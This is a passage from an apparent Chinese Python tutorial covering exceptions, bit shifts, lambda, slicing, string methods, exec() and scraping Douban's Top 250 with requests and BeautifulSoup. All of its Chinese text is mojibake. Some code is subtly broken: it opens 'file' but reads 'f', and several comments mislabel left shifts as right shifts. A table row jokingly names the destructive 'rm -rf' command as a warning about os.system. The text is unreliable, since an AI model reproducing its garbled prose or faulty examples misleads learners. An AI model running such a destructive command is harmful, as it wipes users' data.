¼å¼:os.system() è¿”å›å€¼ï¼šæ•´å‹ æ…ç”¨ï¼ ç©æ„æ¥ä¸ªrm -rf ä½ å°±çˆ½äº†ï¼ |\n| 11   | getenv()     | è·å–ç³»ç»Ÿç¯å¢ƒå˜é‡                              | æ ¼å¼ï¼šos.getenv(è·å–çš„ç¯å¢ƒå˜é‡åç§°) è¿”å›å€¼ï¼šå­—ç¬¦ä¸²           |\n| 12   | putenv()     | è®¾ç½®ç³»ç»Ÿç¯å¢ƒå˜é‡                              | æ ¼å¼ï¼šos.putenv('ç¯å¢ƒå˜é‡åç§°',å€¼) è¿”å›å€¼ï¼šæ—  æ³¨æ„ï¼šæ— æ³•æ­£å¸¸çš„getenvæ£€æµ‹åˆ°ã€‚ |\n| 13   | exit()       | æ¨å‡ºå½“å‰æ‰§è¡Œå‘½ä»¤ï¼Œç›´æ¥å…³é—­å½“å‰æ“ä½œ            | æ ¼å¼:exit() è¿”å›å€¼ï¼šæ—                                        |\n\n### 10 å¼‚å¸¸å¤„ç†\n\n#### 10.1 å¼‚å¸¸ç®€ä»‹\n\n```python\nÂ print '-----test--1---'  \n    open('123.txt','r') Â \n print '-----test--2---'\n```\n\n![image-20200323100011079](https://i.loli.net/2020/03/23/5N6k7RWfDiqSdhb.png)\n\n> æ‰“å¼€ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶123.txtï¼Œå½“æ‰¾ä¸åˆ°123.txt æ–‡ä»¶æ—¶ï¼Œå°±ä¼šæŠ›å‡ºç»™æˆ‘ä»¬ä¸€ä¸ªIOErrorç±»å‹çš„é”™è¯¯ï¼ŒNo such ï¬le or directoryï¼š123.txt ï¼ˆæ²¡æœ‰123.txtè¿™æ ·çš„æ–‡ä»¶æˆ–ç›®å½•ï¼‰\n\n#### 10.2 æ•è·å¼‚å¸¸\n\n```python\ntry:\n \tprint('-----test--1---')  \n    open('123.txt','r') \t \t \n    print('-----test--2---')\nexcept IOError:\n    pass\n```\n\n> æ­¤ç¨‹åºçœ‹ä¸åˆ°ä»»ä½•é”™è¯¯ï¼Œå› ä¸ºç”¨except æ•è·åˆ°äº†IOErrorå¼‚å¸¸ï¼Œå¹¶æ·»åŠ äº†å¤„ç†çš„æ–¹æ³•\n> pass è¡¨ç¤ºå®ç°äº†ç›¸åº”çš„å®ç°ï¼Œä½†ä»€ä¹ˆä¹Ÿä¸åšï¼›å¦‚æœæŠŠpassæ”¹ä¸ºprintè¯­å¥ï¼Œé‚£ä¹ˆå°±ä¼šè¾“å‡ºå…¶ä»–ä¿¡æ¯\n\n**æ€»ç»“ï¼š**\n\n![image-20200323100335376](https://i.loli.net/2020/03/23/vwhZio7kpmXKgfd.png)\næŠŠå¯èƒ½å‡ºç°é—®é¢˜çš„ä»£ç ï¼Œæ”¾åœ¨tryä¸­\næŠŠå¤„ç†å¼‚å¸¸çš„ä»£ç ï¼Œæ”¾åœ¨exceptä¸­\n\n\n```python\ntry:\n Â print num \nexcept IOError:\n Â print('äº§ç”Ÿé”™è¯¯äº†')\n```\n\nä¸Šä¾‹ç¨‹åºï¼Œå·²ç»ä½¿ç”¨exceptæ¥æ•è·å¼‚å¸¸ï¼Œä½†æ˜¯è¿˜ä¼šçœ‹åˆ°é”™è¯¯çš„ä¿¡æ¯æç¤º\n\n> exceptæ•è·çš„é”™è¯¯ç±»å‹æ˜¯IOErrorï¼Œè€Œæ­¤æ—¶ç¨‹åºäº§ç”Ÿçš„å¼‚å¸¸ä¸º NameError ï¼Œæ‰€ä»¥exceptæ²¡æœ‰ç”Ÿæ•ˆ\n\n```python\ntry:\n Â print num\nexcept NameError:\n  print('äº§ç”Ÿé”™è¯¯äº†')\n```\nPythonçš„ä¸€äº›å…§å»ºå¼‚å¸¸ï¼š\n| å¼‚å¸¸              | æè¿°                         |\n| ----------------- | ---------------------------- |\n| Exception         | å¸¸è§„é”™è¯¯çš„åŸºç±»               |\n| AttributeError    | å¯¹è±¡æ²¡æœ‰è¿™ä¸ªå±æ€§             |\n| IOError           | è¾“å…¥/è¾“å‡ºæ“ä½œå¤±è´¥            |\n| IndexError        | åºåˆ—ä¸­æ²¡æœ‰æ­¤ç´¢å¼•(index)      |\n| KeyError          | æ˜ å°„ä¸­æ²¡æœ‰è¿™ä¸ªé”®             |\n| NameError         | æœªå£°æ˜/åˆå§‹åŒ–å¯¹è±¡ (æ²¡æœ‰å±æ€§) |\n| SyntaxError       | Python è¯­æ³•é”™è¯¯              |\n| TypeError         | å¯¹ç±»å‹æ— æ•ˆçš„æ“ä½œ             |\n| ValueError        | ä¼ å…¥æ— æ•ˆçš„å‚æ•°               |\n| ZeroDivisionError | é™¤(æˆ–å–æ¨¡)é›¶ (æ‰€æœ‰æ•°æ®ç±»å‹)  |\næ›´å¤šå¯ä»¥å‚è€ƒï¼šhttp://blog.csdn.net/gavin_john/article/details/50738323\n\n#### 10.3 æ•è·å¤šä¸ªå¼‚å¸¸\n\n```python\n#coding=utf-8 \ntry:\n print('-----test--1---')\nÂ open('123.txt','r') # å¦‚æœ123.txtæ–‡ä»¶ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆä¼šäº§ç”Ÿ IOError å¼‚å¸¸  \n print('-----test--2---')\nÂ print(num)# å¦‚æœnumå˜é‡æ²¡æœ‰å®šä¹‰ï¼Œé‚£ä¹ˆä¼šäº§ç”Ÿ NameError å¼‚å¸¸\nÂ except (IOError,NameError):\nÂ #å¦‚æœæƒ³é€šè¿‡ä¸€æ¬¡exceptæ•è·åˆ°å¤šä¸ªå¼‚å¸¸å¯ä»¥ç”¨ä¸€ä¸ªå…ƒç»„çš„å½¢å¼\n```\n\n#### 10.4 è·å–å¼‚å¸¸çš„ä¿¡æ¯æè¿°\n\n![image-20200323102016442](https://i.loli.net/2020/03/23/tWHDsvy6B9uZf4i.png)\n\n![image-20200323102023020.png](https://i.loli.net/2020/03/23/6HZSOU1LxERMkzp.png)\n\n#### 10.5 try...ï¬nally...\n\n>åœ¨ç¨‹åºä¸­ï¼Œå¦‚æœä¸€ä¸ªæ®µä»£ç å¿…é¡»è¦æ‰§è¡Œï¼Œå³æ— è®ºå¼‚å¸¸æ˜¯å¦äº§ç”Ÿéƒ½è¦æ‰§è¡Œï¼Œé‚£ä¹ˆæ­¤æ—¶å°±éœ€è¦ä½¿ç”¨ï¬nallyã€‚ æ¯”å¦‚æ–‡ä»¶å…³é—­ï¼Œé‡Šæ”¾é”ï¼ŒæŠŠæ•°æ®åº“è¿æ¥è¿”è¿˜ç»™è¿æ¥æ± ç­‰\n\n```python\nimport time\ntry:\n    f = open('test.txt')\n    try:\n        while True:\n            content = f.readline()\n            if len(content) == 0:\n                break\n            time.sleep(2)\n            print(content)\n    except:\n         #å¦‚æœåœ¨è¯»å–æ–‡ä»¶çš„è¿‡ç¨‹ä¸­ï¼Œäº§ç”Ÿäº†å¼‚å¸¸ï¼Œé‚£ä¹ˆå°±ä¼šæ•è·åˆ° Â \n         #æ¯”å¦‚ æŒ‰ä¸‹äº† ctrl+c\n        pass\n    finally:\n        f.close()\n        print('å…³é—­æ–‡ä»¶')\nexcept:\n    print(\"æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶\")\n```\n\ntest.txtæ–‡ä»¶ä¸­æ¯ä¸€è¡Œæ•°æ®æ‰“å°ï¼Œä½†æ˜¯æˆ‘æœ‰æ„åœ¨æ¯æ‰“å°ä¸€è¡Œä¹‹å‰ç”¨time.sleepæ–¹æ³•æš‚åœ2ç§’é’Ÿã€‚è¿™æ ·åšçš„åŸå› æ˜¯è®©ç¨‹åºè¿è¡Œå¾—æ…¢ä¸€äº›ã€‚åœ¨ç¨‹åºè¿è¡Œçš„æ—¶å€™ï¼ŒæŒ‰Ctrl+cä¸­æ–­ï¼ˆå–æ¶ˆï¼‰ç¨‹åºã€‚\næˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°KeyboardInterruptå¼‚å¸¸è¢«è§¦å‘ï¼Œç¨‹åºé€€å‡ºã€‚ä½†æ˜¯åœ¨ç¨‹åºé€€å‡ºä¹‹å‰ï¼Œï¬nallyä»å¥ä»ç„¶è¢«æ‰§è¡Œï¼ŒæŠŠæ–‡ä»¶å…³é—­ã€‚\n\n### 11 PythonçŸ¥è¯†\n\n#### é™¤æ³•\n\n- é™¤ /\n- æ•´é™¤ //\n- æ±‚ä½™ %\n- å•†å’Œä½™æ•°çš„å…ƒç»„ divmod\n\n#### ç§»ä½æ“ä½œ\n\n##### å·¦ç§»ï¼ˆ<<ï¼‰\n\n`a<<nï¼Œåˆ™a' =a*(2^n)`ï¼Œå·¦ç§» n ä½ç›¸å½“äºåŸæ“ä½œæ•°ä¹˜ä»¥ 2^nï¼ŒåŸæ“ä½œæ•°ä¸å‘ç”Ÿå˜åŒ–ã€‚\n\n```python\n>>> 3<<1      # å‘å³ç§»åŠ¨ä¸€ä½ï¼Œç›¸å½“äºæ˜¯ä¹˜ä»¥2\n6             \n>>> -3<<2     # å‘å³ç§»åŠ¨ä¸€ä½ï¼Œç›¸å½“äºæ˜¯ä¹˜ä»¥4\n-12\n```\n\n##### å³ç§»ï¼ˆ>>ï¼‰\n\n`a>>nï¼Œåˆ™a' =a//(2^n)`ï¼Œå·¦ç§» n ä½ç›¸å½“äºåŸæ“ä½œæ•°æ•´é™¤ 2^nï¼ŒåŸæ“ä½œæ•°ä¸å‘ç”Ÿå˜åŒ–ã€‚\n\n```python\n>>> 2>>1     # ç§»åŠ¨ä¸€ä½ï¼Œç›¸å½“äºæ˜¯2//2\n1            \n>>> 2>>2     # ç›¸å½“äºå…ˆå·¦ç§»ä¸€ä½å¾—åˆ°1ï¼Œç»“æœ1å†é™¤ä»¥2ç­‰äº0\n0\n>>> 2>>3     # ç›¸å½“äº2//8\n0  \n          \n>>> -8>>2    # ç§»åŠ¨2ä½ï¼Œç›¸å½“äº-8//4\n-2\n>>> -8>>3    # ç§»åŠ¨3ä½ï¼Œç›¸å½“äºæ˜¯ç”¨ç»“æœ-2å†é™¤ä»¥2\n-1\n>>> -8>>4    # ç§»åŠ¨4ä½ï¼Œç›¸å½“äºæ˜¯ç”¨ç»“æœ-1å†é™¤ä»¥2\n-1\n```\n\nå¦‚æœæ“ä½œæ•°æ˜¯æ­£æ•°ï¼Œé‚£ä¹ˆå¯¹ä¹‹ä¸åœè¿›è¡Œå³ç§»æ“ä½œï¼Œæœ€ç»ˆç»“æœä¸€å®šå¯ä»¥å¾—åˆ° `0`ï¼›å¦‚æœæ“ä½œæ•°æ˜¯è´Ÿæ•°ï¼Œå¯¹ä¹‹ä¸åœè¿›è¡Œå³ç§»æ“ä½œï¼Œæœ€ç»ˆç»“æœä¸€å®šå¯ä»¥å¾—åˆ° `-1`ã€‚\n\n#### åŒ¿åå‡½æ•°lambda\n\nåŒ¿åå‡½æ•° lambda æ˜¯æŒ‡ä¸€ç±»æ— éœ€å®šä¹‰æ ‡è¯†ç¬¦ï¼ˆå‡½æ•°åï¼‰çš„å‡½æ•°æˆ–å­ç¨‹åºã€‚\nlambda å‡½æ•°å¯ä»¥æ¥æ”¶ä»»æ„å¤šä¸ªå‚æ•° (åŒ…æ‹¬å¯é€‰å‚æ•°) å¹¶ä¸”è¿”å›å•ä¸ªè¡¨è¾¾å¼çš„å€¼ã€‚\n\nè¯­æ³•ï¼š\n\n```python\nlambda [arg1,arg2,.....argn]:expression\n```\n\nå†’å·å‰æ˜¯å‚æ•°ï¼Œå¯ä»¥æœ‰å¤šä¸ªï¼Œç”¨é€—å·éš”å¼€ï¼Œå†’å·å³è¾¹çš„ä¸ºè¡¨è¾¾å¼ï¼ˆåªèƒ½ä¸ºä¸€ä¸ªï¼‰ã€‚å…¶å®lambdaè¿”å›å€¼æ˜¯ä¸€ä¸ªå‡½æ•°çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯å‡½æ•°å¯¹è±¡ã€‚\n\n```python\nlambda arg: print(\"hello,world\",arg)\n```\n\nlambdaè¡¨è¾¾å¼é™åˆ¶åªèƒ½åŒ…å«ä¸€è¡Œä»£ç ï¼Œä½†æ˜¯å…¶å®å¯ä»¥åˆ©ç”¨å…ƒç»„æˆ–åˆ—è¡¨å¼ºè¡Œè®©å…¶åŒ…å«å¤šè¡Œã€‚ï¼ˆä½†æ˜¯è¿™ä¹ˆåšä¼šä¸¥é‡å½±å“å¯è¯»æ€§ï¼Œé™¤éä¸‡ä¸å¾—å·²ä¸è¦ä½¿ç”¨ï¼‰\n\n```python\nlambda :(\n    print(\"hello\"),\n    print(\"world\"),           \n)\n```\n\n#### åˆ‡ç‰‡\n\n![](https://img.jwt1399.top//img/20210804114529.png)\n\n```python\nt=[1,2,3,4,5]\n\nprint(t[1:])     å–ç¬¬äºŒä¸ªåˆ°æœ€åä¸€ä¸ªå…ƒç´ \nç»“æœï¼š[2 3 4 5]\n\nprint(t[:])     å–æ‰€æœ‰å…ƒç´ \nç»“æœï¼š[1 2 3 4 5]\n\nprint(t[1:3])     å–t[1]-t[2]\nç»“æœï¼š[ 2 3 ]\n\nprint(t[:-1])     é™¤äº†æœ€åä¸€ä¸ªå–å…¨éƒ¨\nç»“æœï¼š[ 1 2 3 4 ]\n \nprint(t[::-1])     å–ä»åå‘å‰ï¼ˆç›¸åï¼‰çš„å…ƒç´ \nç»“æœï¼š[ 5 4 3 2 1 ]\n \nprint(t[2::-1])     å–ä»ä¸‹æ ‡ä¸º2çš„å…ƒç´ ç¿»è½¬è¯»å–\nç»“æœï¼š[ 3 2 1 ]\n```\n\n#### å­—ç¬¦ä¸²æ–¹æ³•\n\n#####  join(iterable)\n\n> è·å–å¯è¿­ä»£å¯¹è±¡(iterable)ä¸­çš„æ‰€æœ‰é¡¹ç›®ï¼Œå¹¶å°†å®ƒä»¬è¿æ¥ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚\n\nå®ä¾‹1ï¼š\n\n```python\nmyTuple = (\"Bill\", \"Steve\", \"Elon\")\nx = \"#\".join(myTuple)\nprint(x)\n\n'''\nè¾“å‡ºï¼š\nBill#Steve#Elon\n'''\n```\n\nå®ä¾‹2ï¼š\n\n```python\nmyDict = {\"name\": \"Bill\", \"country\": \"USA\"}\nmySeparator = \"TEST\"\nx = mySeparator.join(myDict)\nprint(x)\n\n'''\nè¾“å‡ºï¼š\nnameTESTcountry\n'''\n```\n\n\næ³¨é‡Šï¼šåœ¨ä½¿ç”¨å­—å…¸ä½œä¸ºè¿­ä»£å™¨æ—¶ï¼Œè¿”å›çš„å€¼æ˜¯é”®ï¼Œè€Œä¸æ˜¯å€¼ã€‚\n\n##### split(separator, max)\n\n> å°†å­—ç¬¦ä¸²æ‹†åˆ†ä¸ºåˆ—è¡¨ï¼Œæ‚¨å¯ä»¥æŒ‡å®šåˆ†éš”ç¬¦ï¼Œé»˜è®¤åˆ†éš”ç¬¦æ˜¯ä»»ä½•ç©ºç™½å­—ç¬¦ã€‚è‹¥æŒ‡å®š maxï¼Œåˆ—è¡¨å°†åŒ…å«æŒ‡å®šæ•°é‡åŠ ä¸€çš„å…ƒç´ ã€‚\n\nå®ä¾‹1ï¼š\n\n```python\ntxt = \"welcome to China\"\nx = txt.split()\nprint(x)\n\n'''\nè¾“å‡ºï¼š\n['welcome', 'to', 'China']\n'''\n```\n\nå®ä¾‹2ï¼š\n\n```python\ntxt = \"apple#banana#cherry#orange\"\n# å°† max å‚æ•°è®¾ç½®ä¸º 1ï¼Œå°†è¿”å›åŒ…å« 2 ä¸ªå…ƒç´ çš„åˆ—è¡¨ï¼\nx = txt.split(\"#\", 1)\nprint(x)\n\n'''\nè¾“å‡ºï¼š\n['apple', 'banana#cherry#orange']\n'''\n```\n\n#### å†…ç½®å‡½æ•°\n\n##### enumerate()\n\n> ç”¨äºå°†ä¸€ä¸ªå¯éå†çš„æ•°æ®å¯¹è±¡(å¦‚åˆ—è¡¨ã€å…ƒç»„æˆ–å­—ç¬¦ä¸²)ç»„åˆä¸ºä¸€ä¸ªç´¢å¼•åºåˆ—ï¼ŒåŒæ—¶åˆ—å‡ºæ•°æ®å’Œæ•°æ®ä¸‹æ ‡ï¼Œä¸€èˆ¬ç”¨åœ¨ for å¾ªç¯å½“ä¸­ã€‚\n\nå®ä¾‹1ï¼š\n\n```python\n>>>seq = ['one', 'two', 'three']\n>>> for i, element in enumerate(seq):\n...     print i, element\n... \n0 one\n1 two\n2 three\n```\n\nå®ä¾‹2ï¼š\n\n```python\n>>>seasons = ['Spring', 'Summer', 'Fall', 'Winter']\n>>> list(enumerate(seasons))\n[(0, 'Spring'), (1, 'Summer'), (2, 'Fall'), (3, 'Winter')]\n>>> list(enumerate(seasons, start=1))       # ä¸‹æ ‡ä» 1 å¼€å§‹\n[(1, 'Spring'), (2, 'Summer'), (3, 'Fall'), (4, 'Winter')]\n```\n\n##### exec()\n\n> exec æ‰§è¡Œå‚¨å­˜åœ¨å­—ç¬¦ä¸²æˆ–æ–‡ä»¶ä¸­çš„ Python è¯­å¥ï¼Œç›¸æ¯”äº evalï¼Œexecå¯ä»¥æ‰§è¡Œæ›´å¤æ‚çš„ Python ä»£ç ã€‚\n\n```python\n# å•è¡Œè¯­å¥å­—ç¬¦ä¸²\n>>>exec('print(\"Hello World\")')\nHello World\n\n#  å¤šè¡Œè¯­å¥å­—ç¬¦ä¸²\n>>> exec (\"\"\"for i in range(5):\n...     print (\"iter time: %d\" % i)\n... \"\"\")\niter time: 0\niter time: 1\niter time: 2\niter time: 3\niter time: 4\n```\n\n## äºŒã€Pythonçˆ¬è™«\n\n> ä¸‹é¢çš„å­¦ä¹ æ–¹å¼æ˜¯ä»¥çˆ¬å–[è±†ç“£top250](https://movie.douban.com/top250?start=) ç½‘é¡µè¿›è¡Œå¼€å±•çš„\n>\n> åŸºæœ¬æµç¨‹:    çˆ¬å–ç½‘é¡µ--->è§£ææ•°æ®--->ä¿å­˜æ•°æ®\n\n### 1 requestsåº“\n\n>`Requests`æ˜¯ä¸€ä¸ªç®€å•æ–¹ä¾¿çš„`HTTP åº“`ã€‚æ¯”`Python`æ ‡å‡†åº“ä¸­çš„`urllib2`æ¨¡å—åŠŸèƒ½å¼ºå¤§ã€‚Requests ä½¿ç”¨çš„æ˜¯ urllib3ï¼Œå› æ­¤ç»§æ‰¿äº†å®ƒçš„æ‰€æœ‰ç‰¹æ€§ã€‚Requests æ”¯æŒä½¿ç”¨`cookie` ä¿æŒä¼šè¯ï¼Œæ”¯æŒæ–‡ä»¶ä¸Šä¼ ï¼Œæ”¯æŒè‡ªåŠ¨ç¡®å®šå“åº”å†…å®¹çš„ç¼–ç ï¼Œæ”¯æŒ`URL` å’Œ `POST` æ•°æ®è‡ªåŠ¨ç¼–ç ã€‚å¸®åŠ©æˆ‘ä»¬è½»æ¾è§£å†³å…³äº`HTTP`çš„å¤§éƒ¨åˆ†é—®é¢˜ã€‚\n\nçˆ¬å–ç½‘é¡µé¦–å…ˆè¦å­¦ä¹ requestsåº“æˆ–è€…urllibåº“çš„ä½¿ç”¨,ä¸ç„¶ä½ æ— æ³•çœ‹æ‡‚ä¸‹é¢ä»£ç \n\nå­¦ä¹ requestsåº“,è¯·çœ‹æˆ‘å¦å¤–ä¸€ç¯‡æ–‡ç« ï¼Œé‡Œé¢å¯¹requestsåº“è¿›è¡Œäº†è¯¦ç»†çš„è®²è§£[Pythonæ¨¡å—-Requestså­¦ä¹ ](https://jwt1399.top/2019/08/08/python-mo-kuai-xue-xi-zhi-requests/)\n\n### 2 çˆ¬å–ç½‘é¡µ\n\n#### 2.1 çˆ¬å–[è±†ç“£top250](https://movie.douban.com/top250?start=)ç¬¬ä¸€é¡µæ•°æ®\n\n```python\n#-*- coding =utf-8 -*-\nimport requests\n\ndef askUrl(url):\n    head = { #æ¨¡æ‹Ÿæµè§ˆå™¨å¤´éƒ¨ä¿¡æ¯ï¼Œå‘è±†ç“£æœåŠ¡å™¨å‘é€æ¶ˆæ¯\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.69 Safari/537.36 Edg/81.0.416.34\"\n    # ç”¨æˆ·ä»£ç†ï¼šå‘Šè¯‰è±†ç“£æœåŠ¡å™¨ï¼Œæˆ‘ä»¬æ˜¯ä»€ä¹ˆç±»å‹çš„æµè§ˆå™¨ï¼ˆæœ¬è´¨ä¸Šæ˜¯å‘Šè¯‰æµè§ˆå™¨æˆ‘ä»¬å¯ä»¥æ¥æ”¶ä»€ä¹ˆæ°´å¹³çš„æ–‡ä»¶å†…å®¹ï¼‰\n    }\n    html=\"\"  #ç”¨æ¥æ¥æ”¶æ•°æ®\n    r = requests.get(url, headers = head) #getæ–¹å¼å‘é€è¯·æ±‚\n    html = r.text #æ¥æ”¶æ•°æ®\n    print(html)  \n    return html\n\nif __name__ == \"__main__\": # mainå‡½æ•°ç”¨äºæµ‹è¯•ç¨‹åº\n    askUrl(\"https://movie.douban.com/top250?start=\") #è°ƒç”¨å‡½æ•°\n```\n\nå¯ä»¥çœ‹åˆ°æˆåŠŸçš„çˆ¬å–åˆ°è±†ç“£top250ç¬¬ä¸€é¡µçš„æ•°æ®\n\n![image-20200327113957848](https://i.loli.net/2020/03/27/bI84MCajdFuvZJw.png)\n\n#### 2.2 çˆ¬å–[è±†ç“£top250](https://movie.douban.com/top250?start=)å‰10é¡µæ•°æ®\n\n```python\n#-*- coding =utf-8 -*-\nimport requests\n\n#çˆ¬å–ä¸€ä¸ªé¡µé¢\ndef askUrl(url):\n    head = { #æ¨¡æ‹Ÿæµè§ˆå™¨å¤´éƒ¨ä¿¡æ¯ï¼Œå‘è±†ç“£æœåŠ¡å™¨å‘é€æ¶ˆæ¯\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.69 Safari/537.36 Edg/81.0.416.34\"\n    # ç”¨æˆ·ä»£ç†ï¼šå‘Šè¯‰è±†ç“£æœåŠ¡å™¨ï¼Œæˆ‘ä»¬æ˜¯ä»€ä¹ˆç±»å‹çš„æµè§ˆå™¨ï¼ˆæœ¬è´¨ä¸Šæ˜¯å‘Šè¯‰æµè§ˆå™¨æˆ‘ä»¬å¯ä»¥æ¥æ”¶ä»€ä¹ˆæ°´å¹³çš„æ–‡ä»¶å†…å®¹ï¼‰\n    }\n    #html=\"\"\n    r = requests.get(url, headers = head)\n    html = r.text\n    print(html)\n\n# çˆ¬å–æ‰€æœ‰é¡µé¢\ndef getData(baseurl):\n    for i in range(0, 10):\n        url = baseurl + str(i * 25)\n        html = askUrl(url)\n\nif __name__ == \"__main__\": # mainå‡½æ•°ç”¨äºæµ‹è¯•ç¨‹åº\n    baseurl = \"https://movie.douban.com/top250?start=\"\n    getData(baseurl)\n```\n\nå¯ä»¥çœ‹åˆ°æ’å250çš„æ¢¦ä¹‹å®‰é­‚æ›²ä¹Ÿè¢«æˆåŠŸçˆ¬å–åˆ°\n\n![image-20200327115150029](https://i.loli.net/2020/03/27/7CDiZOo5jtu2MYw.png)\n\n### 3 BeautifulSoup4åº“\n\n> BeautifulSoup4å’Œ lxml ä¸€æ ·ï¼ŒBeautiful Soup ä¹Ÿæ˜¯ä¸€ä¸ªHTML/XMLçš„è§£æå™¨ï¼Œä¸»è¦çš„åŠŸèƒ½ä¹Ÿæ˜¯å¦‚ä½•è§£æå’Œæå– HTML/XML æ•°æ®ã€‚\n\nä»¥ä¸‹åªæ¶‰åŠåŸºç¡€ä½¿ç”¨ï¼Œè¯¦æƒ…è¯·çœ‹ä¸­æ–‡æ–‡æ¡£ï¼š[Beautiful Soup 4.4.0 æ–‡æ¡£](https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/)\n\nå‡è®¾æœ‰è¿™æ ·ä¸€ä¸ªbaidu.htmlï¼Œæ”¾åœ¨pyæ–‡ä»¶ç›®å½•ä¸‹ï¼Œä¸‹é¢çš„ä¾‹å­éƒ½åŸºäºè¯¥html,å…·ä½“å†…å®¹å¦‚ä¸‹ï¼š\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <meta content=\"text/html;charset=utf-8\" http-equiv=\"content-type\" />\n    <meta content=\"IE=Edge\" http-equiv=\"X-UA-Compatible\" />\n    <meta content=\"always\" name=\"referrer\" />\n    <link href=\"https://ss1.bdstatic.com/5eN1bjq8AAUYm2zgoY3K/r/www/cache/bdorz/baidu.min.css\" rel=\"stylesheet\" type=\"text/css\" />\n    <title>ç™¾åº¦ä¸€ä¸‹ï¼Œä½ å°±çŸ¥é“ </title>\n</head>\n<body link=\"#0000cc\">\n  <div id=\"wrapper\">\n    <div id=\"head\">\n        <div class=\"head_wrapper\">\n          <div id=\"u1\">\n            <a class=\"mnav\" href=\"http://news.baidu.com\" name=\"tj_trnews\"><!--æ–°é—»--></a>\n            <a class=\"mnav\" href=\"http://news.baidu.com\" name=\"tj_trnews\">æ–°é—»</a>\n            <a class=\"mnav\" href=\"https://www.hao123.com\" name=\"tj_trhao123\">hao123</a>\n            <a class=\"mnav\" href=\"http://map.baidu.com\" name=\"tj_trmap\">åœ°å›¾</a>\n            <a class=\"mnav\" href=\"http://v.baidu.com\" name=\"tj_trvideo\">è§†é¢‘</a>\n            <a class=\"mnav\" href=\"http://tieba.baidu.com\" name=\"tj_trtieba\">è´´å§</a>\n            <a class=\"bri\" href=\"//www.baidu.com/more/\" name=\"tj_briicon\" style=\"display: block;\">æ›´å¤šäº§å“ </a>\n          </div>\n        </div>\n    </div>\n  </div>\n</body>\n</html>\n```\n\n#### 3.1 å¿«é€Ÿä½¿ç”¨æ¡ˆä¾‹\n\n```python\n# å¯¼å…¥æ¨¡å—\nfrom bs4 import BeautifulSoup\n\n# è¯»å–htmlæ–‡ä»¶ä¿¡æ¯ï¼ˆåœ¨çœŸå®ä»£ç ä¸­æ˜¯çˆ¬å–çš„ç½‘é¡µä¿¡æ¯ï¼‰\nfile = open(\"./baidu.html\",'rb') #è§£æå™¨\ncontent = f.read()\nf.close()\n\n# åˆ›å»ºè§£æå™¨\nbs = BeautifulSoup(content,\"html.parser\")\n\n# è¾“å‡ºç½‘é¡µå†…å®¹ï¼šæ³¨ï¼šæ­¤å†…å®¹å·²è¢«ç¼©è¿›æ ¼å¼åŒ–ï¼ˆè‡ªåŠ¨æ›´æ­£æ ¼å¼ï¼‰ï¼Œå…¶å®è¿™ä¸ªæ˜¯åœ¨ä¸Šä¸€æ­¥å®ä¾‹åŒ–æ—¶å°±å·²å®Œæˆ\nprint(bs)\n\n#è¾“å‡ºç½‘é¡µä¸­titleæ ‡ç­¾ä¸­çš„å†…å®¹\nprint(bs.title.string)\n```\n#### 3.2 BeautifulSoup4ä¸»è¦è§£æå™¨\n\n| è§£æå™¨           | ä½¿ç”¨æ–¹æ³•                                                     | ä¼˜åŠ¿                                                      | åŠ£åŠ¿                                          |\n| ---------------- | ------------------------------------------------------------ | --------------------------------------------------------- | --------------------------------------------- |\n| Pythonæ ‡å‡†åº“     | BeautifulSoup(markup, \"html.parser\")                         | Pythonçš„å†…ç½®æ ‡å‡†åº“ï¼Œæ‰§è¡Œé€Ÿåº¦é€‚ä¸­ï¼Œæ–‡æ¡£å®¹é”™èƒ½åŠ›å¼º          | Python 2.7.3 or 3.2.2å‰çš„ç‰ˆæœ¬ä¸­æ–‡æ¡£å®¹é”™èƒ½åŠ›å·® |\n| lxml HTML è§£æå™¨ | BeautifulSoup(markup, \"lxml\")                                | é€Ÿåº¦å¿« æ–‡æ¡£å®¹é”™èƒ½åŠ›å¼º                                     | éœ€è¦å®‰è£…Cè¯­è¨€åº“                               |\n| lxml XML è§£æå™¨  | BeautifulSoup(markup, [\"lxml-xml\"]) BeautifulSoup(markup, \"xml\") | é€Ÿåº¦å¿« å”¯ä¸€æ”¯æŒXMLçš„è§£æå™¨                                | éœ€è¦å®‰è£…Cè¯­è¨€åº“                               |\n| html5lib         | BeautifulSoup(markup, \"html5lib\")                            | æœ€å¥½çš„å®¹é”™æ€§ï¼Œä»¥æµè§ˆå™¨çš„æ–¹å¼è§£ææ–‡æ¡£ï¼Œç”ŸæˆHTML5æ ¼å¼çš„æ–‡æ¡£ | é€Ÿåº¦æ…¢ã€ä¸ä¾èµ–å¤–éƒ¨æ‰©å±•                        |\n\n#### 3.2  BS4å››å¤§å¯¹è±¡ç§ç±»\n\n> BeautifulSoup4å°†å¤æ‚HTMLæ–‡æ¡£è½¬æ¢æˆä¸€ä¸ªå¤æ‚çš„æ ‘å½¢ç»“æ„,æ¯ä¸ªèŠ‚ç‚¹éƒ½æ˜¯Pythonå¯¹è±¡,æ‰€æœ‰å¯¹è±¡å¯ä»¥å½’çº³ä¸º4ç§\n\n* Tag\n* NavigableString\n* BeautifulSoup \n* Comment\n\n##### 3.2.1 Tag\n\n> Tagé€šä¿—ç‚¹è®²å°±æ˜¯ä¸ºäº†è·å–HTMLä¸­çš„ä¸€ä¸ªä¸ªæ ‡ç­¾\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\n# è·å–titleæ ‡ç­¾çš„æ‰€æœ‰å†…å®¹\nprint(bs.title)  #<title>ç™¾åº¦ä¸€ä¸‹ï¼Œä½ å°±çŸ¥é“ </title>\n\n# è·å–headæ ‡ç­¾çš„æ‰€æœ‰å†…å®¹\nprint(bs.head) \n\n# è·å–ç¬¬ä¸€ä¸ªaæ ‡ç­¾çš„æ‰€æœ‰å†…å®¹\nprint(bs.a) \n\n# ç±»å‹\nprint(type(bs.a)) # <class 'bs4.element.Tag'>\n\n\n#bs 